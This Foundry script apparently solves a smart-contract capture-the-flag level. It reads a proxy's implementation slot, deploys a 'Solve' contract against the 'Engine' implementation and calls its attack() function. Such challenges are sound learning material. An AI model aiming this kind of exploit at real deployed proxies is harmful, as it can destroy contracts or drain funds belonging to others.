// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/Solve.sol";

contract Deploy is Script {
    Solve public solve;

    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address proxy = 0x5E98de9e76838e7a52293FcDec3f439fbA2d3270;
    address target;

    function setUp() public {}

    function run() public {
        target = address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));

        vm.startBroadcast();

        solve = new Solve(target);

        solve.attack();

        console.log("Deploy address:", address(this));
        console.log("Attacker address:", address(solve));
        console.log("Engine address:", target);

        vm.stopBroadcast();
    }
}
